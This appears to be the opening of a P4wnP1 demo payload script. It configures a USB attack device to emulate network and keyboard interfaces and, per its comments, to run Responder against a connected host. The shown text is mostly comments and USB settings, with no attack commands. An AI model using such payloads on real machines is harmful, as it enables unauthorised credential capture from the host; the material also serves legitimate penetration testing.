# P4wnP1 demo payload by MaMe82
# ==========================
# starts Responder on RNDIS / CDC ECM interface
# prints out stats in several payload stages via HID keyboard on target
# prints out some stats to screen of P4wnP1
# automatically brings Responder screen session to front on login
# (the session could be detached by pressin <CTRL>+<A> , <D>)
# Don't forget to change keyboard language to your locale


# =============================
# USB setup
# =============================
# Make sure to change USB_PID if you enable different USB functionality in order
# to force Windows to enumerate the device again
USB_VID="0x1d6b"        # Vendor ID
USB_PID="0x0105"        # Product ID

USE_ECM=true            # if true CDC ECM will be enabled
USE_RNDIS=true          # if true RNDIS will be enabled
USE_HID=true            # if true HID (keyboard) will be enabled
USE_UMS=false           # if true USB Mass Storage will be enabled

# Network and DHCP options
# ==========================
